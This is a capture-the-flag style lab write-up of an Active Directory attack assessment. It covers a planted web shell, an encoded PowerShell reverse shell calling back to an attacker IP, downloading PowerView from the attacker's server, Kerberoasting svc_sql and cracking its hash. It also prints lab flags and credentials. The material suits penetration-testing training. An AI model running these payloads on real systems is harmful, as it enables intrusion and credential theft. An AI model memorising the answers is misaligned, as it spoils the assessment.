## AD Enumeration & Attacks - Skills Assessment Part I

**Scenario**
A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: admin:My_W3bsH3ll_P@ssw0rd!) in place for us to start from in the /uploads directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part I of the skills assessment.

1-  **Submit the contents of the flag.txt file on the administrator Desktop of the web server**

I started by performing an Nmap scan on the target to identify open ports and running services:

```c
nmap -sC -sV 10.129.63.234
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-26 09:46 CDT
Nmap scan report for 10.129.63.234
Host is up (0.030s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-26T14:46:54
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.51 seconds
```
I then navigated to the Antak webshell hosted on the IIS server by opening Firefox and navigating to **http://10.129.63.234/uploads/antak.aspx**. Logged in with the credentials provided.

Before executing a reverse shell, I set up a Netcat listener on my Linux machine to catch the incoming connection:
```c
nc -lvnp 4444
```

From the Antak webshell, I executed the following PowerShell payload to establish a reverse shell:
```c

PS> powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAwADgAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```
To improve interactivity, I upgraded the shell using Python:

```c
python -c 'import pty; pty.spawn("cmd.exe")'
```
Once I had an upgraded shell, I navigated to the Administrator's Desktop directory:

```c

PS C:\USers\Administrator\Desktop> cat flag.txt
JusT_g3tt1ng_st@rt3d
```
2- **Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer**

I started by hosting a Python HTTP server on my attacking machine:

```c
python3 -m http.server 8000
```

On the Windows target, I used PowerShell to download the PowerView script:

```c
PS C:\Users\Administrator\Desktop> Invoke-WebRequest -Uri "http://10.10.14.108:8000/PowerView.ps1" -OutFile "C:\Users\Administrator\Desktop\PowerView.ps1"
```
Once transferred, I imported the module:

```c
PS C:\Users\Administrator\Desktop> Import-Module .\PowerView.ps1

```
With PowerView loaded, I enumerated all domain users with associated Service Principal Names (SPNs), which are potential targets for Kerberoasting:
```c
PS C:\Users\Administrator\Desktop> Get-DomainUser * -spn | select samaccountname, serviceprincipalname

samaccountname serviceprincipalname                       
-------------- --------------------                       
azureconnect   adfsconnect/azure01.inlanefreight.local    
backupjob      backupjob/veam001.inlanefreight.local      
krbtgt         kadmin/changepw                            
sqltest        MSSQLSvc/DEVTEST.inlanefreight.local:1433  
sqlqa          MSSQLSvc/QA001.inlanefreight.local:1433    
sqldev         MSSQLSvc/SQL-DEV01.inlanefreight.local:1433
svc_sql        MSSQLSvc/SQL01.inlanefreight.local:1433    
sqlprod        MSSQLSvc/SQL02.inlanefreight.local:1433    

```
3- **Crack the account's password. Submit the cleartext value.**

I started by running the following command to request a Kerberos Service Ticket for the svc_sql account:

```c
PS C:\Users\Administrator\Desktop> Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat


SamAccountName       : svc_sql
DistinguishedName    : CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/SQL01.inlanefreight.local:1433
TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$415E158F7F0FC8
                       C98AF3C19C7E44D0FC$F2D9F0253D35273AD9DBBCC3FA1EDBBEB41229DEA9258F3A2FEC4FCA7A5437E45D9D28D470606
                       F8CBF5BE17F38C5FA4992E2A9377B479FC2155A1C12534705678254A4E243EFBAEC43C627A907C8E8F9635E47A35ED63
                       EFA6DCD5CBF9039F9536B03E24E21B71E01280A19B1E3559EAF3B8E6777CFF382FE07859FEBD7C5851BC5B3383B20B50
                       92E60AB1511147FB55298751602109DD932569E5FFFC0C950314FE46633BCE5CB3E55151D17F2B4344C95B65F01E0894
                       5D597600752B4D6DCFC3498217CF455DE4CE3C56F30948E351EAA1D8FA2B60DAD5DE7D4A2D45BF10853A03B994A92177
                       DAE355DF5DDBA0E4FF454E2C8DA3B4F60DC96A6C361C74E2D5F6E594F9E428F005FE2074DE42190CE2D803862069BB88
                       5EEBC6F60F3FCEC6AA7181CF0AF4AE81D8286E5CFB6AD89243F3EE11D189E902FD50ED1F99704CF588229E24F349CB19
                       71D47DBD7666E44343F56A72640C92039420AA66FDFDB40569FFDF6C1FB21AD750EED5489D5A06513C0A0F52A471C27F
                       CBD4CA52182AF8544067A416D131BFB91188F1AE13679F7A79A18E1625D2D12B24DDD8987350E9042EBB0D705212C162
                       948AA167F558C579850ADB2D0EC3E5146E0780093C307E61123FC79D526D3B155996684E53E5D016664FDD9DAF546E79
                       235D0B895727BEB161988401EA814AF7B9D246ED6E3D5D51D69F6E8277B9A6D6ECA542AD90556ED2ED2693DD46E8E3BD
                       9BD964FBB2D763CBFB2D2C9D4EC5402EAA4208DA66E7090F1B947763D9469E7B462993FFC1E147AC76ADDD54AA2733BD
                       F93F0EBEA31DF6F77EE89A3A86E171A3D18E14F6557FC6CC50F0B67E61151E24F2DD4B47E877BED12D20044525D68E5B
                       40CF0DDBC7D6189A59C347A976E01F46AE4629D124194BC816123D7EC7C48454C7197366932AB99EB0D936E4BB7FC78C
                       408E218F45AAEAF1804A369D56FEE18D8C11FE71AFDBC6CE3D25D0E1C6F03800B5B6F202B989126C966554EA7A26CDE4
                       1C2DEE478ECD539C9C13F7E8D7550D4252B20EE00AA293669D5CBD5C37FEC61F1C9F1DC47F907BF693257DEE8FDECF25
                       D9C9798065ABAB7E83C3415DE86291DCED55482BA107E048E0178B50D1627E20C11E81337F3EF3AB3142BDDBD7E90376
                       002134A7BDF0F02EE482932291459325D57BDF6CEBF2F5E9CAE77129340D5220B1B269249C5F16EBBF29BF72DD92FCB5
                       B5F7B3BEE7621BAEB9DF37BC11238E237CA41BFE599E5A6F4CAFDBC1888E4977538172644D121407678E0E2ECC81D6B8
                       84DFF3EC27798E1720FF7613B3EF55E417635ADC6E8AC242D064855E7D2882BADC9990C2DACAA02D4963BDCCE47FF444
                       475272F5C130ACB25BD20DF71A59180A9A492841FBDC0DF096475E02CC299D4319FE0D19556F862173C52434B0C6535B
                       270A3B0B33714E1AB9FC8656562D50A94CB7408193D62BA550289CB0B148813274404F6A7134301A8A08A4B37A3BA1F3
                       A135648D003338519B61C5E26B4870886286AED29DC1944793035F4318B5514E575

```

I copied the hash and transferred it to my attack machine. Once the hash was on my system, I used Hashcat to attempt to crack it with the rockyou.txt wordlist:

```c

hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
<snip>

$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$415e158f7f0fc8c98af3c19c7e44d0fc$f2d9f0253d35273ad9dbbcc3fa1edbbeb41229dea9258f3a2fec4fca7a5437e45d9d28d470606f8cbf5be17f38c5fa4992e2a9377b479fc2155a1c12534705678254a4e243efbaec43c627a907c8e8f9635e47a35ed63efa6dcd5cbf9039f9536b03e24e21b71e01280a19b1e3559eaf3b8e6777cff382fe07859febd7c5851bc5b3383b20b5092e60ab1511147fb55298751602109dd932569e5fffc0c950314fe46633bce5cb3e55151d17f2b4344c95b65f01e08945d597600752b4d6dcfc3498217cf455de4ce3c56f30948e351eaa1d8fa2b60dad5de7d4a2d45bf10853a03b994a92177dae355df5ddba0e4ff454e2c8da3b4f60dc96a6c361c74e2d5f6e594f9e428f005fe2074de42190ce2d803862069bb885eebc6f60f3fcec6aa7181cf0af4ae81d8286e5cfb6ad89243f3ee11d189e902fd50ed1f99704cf588229e24f349cb1971d47dbd7666e44343f56a72640c92039420aa66fdfdb40569ffdf6c1fb21ad750eed5489d5a06513c0a0f52a471c27fcbd4ca52182af8544067a416d131bfb91188f1ae13679f7a79a18e1625d2d12b24ddd8987350e9042ebb0d705212c162948aa167f558c579850adb2d0ec3e5146e0780093c307e61123fc79d526d3b155996684e53e5d016664fdd9daf546e79235d0b895727beb161988401ea814af7b9d246ed6e3d5d51d69f6e8277b9a6d6eca542ad90556ed2ed2693dd46e8e3bd9bd964fbb2d763cbfb2d2c9d4ec5402eaa4208da66e7090f1b947763d9469e7b462993ffc1e147ac76addd54aa2733bdf93f0ebea31df6f77ee89a3a86e171a3d18e14f6557fc6cc50f0b67e61151e24f2dd4b47e877bed12d20044525d68e5b40cf0ddbc7d6189a59c347a976e01f46ae4629d124194bc816123d7ec7c48454c7197366932ab99eb0d936e4bb7fc78c408e218f45aaeaf1804a369d56fee18d8c11fe71afdbc6ce3d25d0e1c6f03800b5b6f202b989126c966554ea7a26cde41c2dee478ecd539c9c13f7e8d7550d4252b20ee00aa293669d5cbd5c37fec61f1c9f1dc47f907bf693257dee8fdecf25d9c9798065abab7e83c3415de86291dced55482ba107e048e0178b50d1627e20c11e81337f3ef3ab3142bddbd7e90376002134a7bdf0f02ee482932291459325d57bdf6cebf2f5e9cae77129340d5220b1b269249c5f16ebbf29bf72dd92fcb5b5f7b3bee7621baeb9df37bc11238e237ca41bfe599e5a6f4cafdbc1888e4977538172644d121407678e0e2ecc81d6b884dff3ec27798e1720ff7613b3ef55e417635adc6e8ac242d064855e7d2882badc9990c2dacaa02d4963bdcce47ff444475272f5c130acb25bd20df71a59180a9a492841fbdc0df096475e02cc299d4319fe0d19556f862173c52434b0c6535b270a3b0b33714e1ab9fc8656562d50a94cb7408193d62ba550289cb0b148813274404f6a7134301a8a08a4b37a3ba1f3a135648d003338519b61c5e26b4870886286aed29dc1944793035f4318b5514e575:lucky7

<snip>

```
After a few moments, Hashcat successfully cracked the hash, revealing the password for the svc_sql account.
